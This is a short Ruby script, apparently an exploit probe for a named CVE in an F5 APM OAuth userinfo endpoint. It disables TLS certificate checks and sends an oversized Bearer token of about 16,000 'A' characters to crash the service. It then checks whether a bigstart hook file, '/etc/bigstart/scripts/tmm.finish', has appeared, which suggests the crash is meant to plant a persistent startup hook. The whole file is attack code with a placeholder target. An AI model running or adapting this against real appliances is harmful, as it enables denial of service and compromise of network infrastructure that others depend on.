require 'net/http'
require 'openssl'

# Probe for CVE-2026-94127: oversized Bearer against the APM userinfo
# endpoint, then check whether the crash dropped our bigstart hook marker.
uri = URI('https://target.example.invalid/f5-oauth2/v1/userinfo')
http = Net::HTTP.new(uri.hostname, uri.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE
req = Net::HTTP::Get.new(uri)
req['Authorization'] = 'Bearer ' + 'A' * 0x4100
res = http.request(req)
puts res.code

HOOK = '/etc/bigstart/scripts/tmm.finish'.freeze
puts "hook present: #{File.exist?(HOOK)}"
